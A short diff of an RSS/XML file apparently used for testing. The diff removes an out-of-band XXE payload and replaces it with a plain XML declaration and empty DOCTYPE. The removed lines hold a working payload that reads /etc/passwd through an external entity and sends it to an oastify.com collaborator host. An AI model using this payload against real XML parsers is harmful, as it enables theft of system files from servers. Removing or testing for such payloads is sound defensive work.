@@ -1,11 +1,8 @@
-<!ENTITY % file SYSTEM "file:///etc/passwd">
-<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'https://vji5j8zjebmpkcida8lk712nhen5bxzm.oastify.com/?data=%file;'>">
-%eval;
-%exfil;
-]>
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE foo []>
 <rss version="2.0">
   <channel>
     <title>Test</title>
-    <description>Test</description>
+    <description>test</description>
   </channel>
 </rss>
